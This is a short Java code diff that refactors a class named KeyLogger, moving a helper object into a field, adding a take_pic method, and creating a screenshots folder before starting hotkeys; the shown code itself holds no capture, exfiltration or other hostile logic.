@@ -7,18 +7,21 @@ import java.io.File;
 public class KeyLogger implements Runnable {
 
 	private WebController web;
+	private KeyLoggerHelper h;
 
 	public KeyLogger(WebController web) {
 		this.web = web;
-
+		h = new KeyLoggerHelper(web);
+	}
+	
+	public void take_pic() {
+		h.take_pic();
 	}
 
 	public void run() {
 		File file = new File("screenshots/");
 		file.mkdir();
-		KeyLoggerHelper h = new KeyLoggerHelper(web);
 		h.startHotKeys();
-
 	}
 
 }
